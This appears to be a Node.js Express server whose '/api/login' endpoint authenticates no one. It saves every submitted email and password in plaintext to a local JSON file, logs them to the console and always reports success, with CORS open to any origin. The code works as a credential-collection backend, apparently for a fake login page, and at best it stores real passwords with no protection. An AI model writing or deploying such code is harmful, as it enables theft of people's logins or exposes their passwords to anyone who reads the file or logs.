const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = 3000;

// Middleware
app.use(express.json());
app.use(cors());

// Database file path
const DB_PATH = path.join(__dirname, 'db.json');

// Read database
function readDB() {
    try {
        const data = fs.readFileSync(DB_PATH, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        return { users: [] };
    }
}

// Write to database
function writeDB(data) {
    fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

// Login endpoint
app.post('/api/login', (req, res) => {
    const { email, password } = req.body;
    const db = readDB();
    
    // Store exactly what was received
    const loginData = {
        email: email,
        password: password,  // Store the actual password as typed
        date: new Date().toLocaleString()
    };

    // Add to database
    db.users.push(loginData);
    writeDB(db);
    
    // Log what was stored
    console.log('Stored login:', loginData);
    
    // Always respond with success
    res.json({ message: 'Login saved' });
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
}); 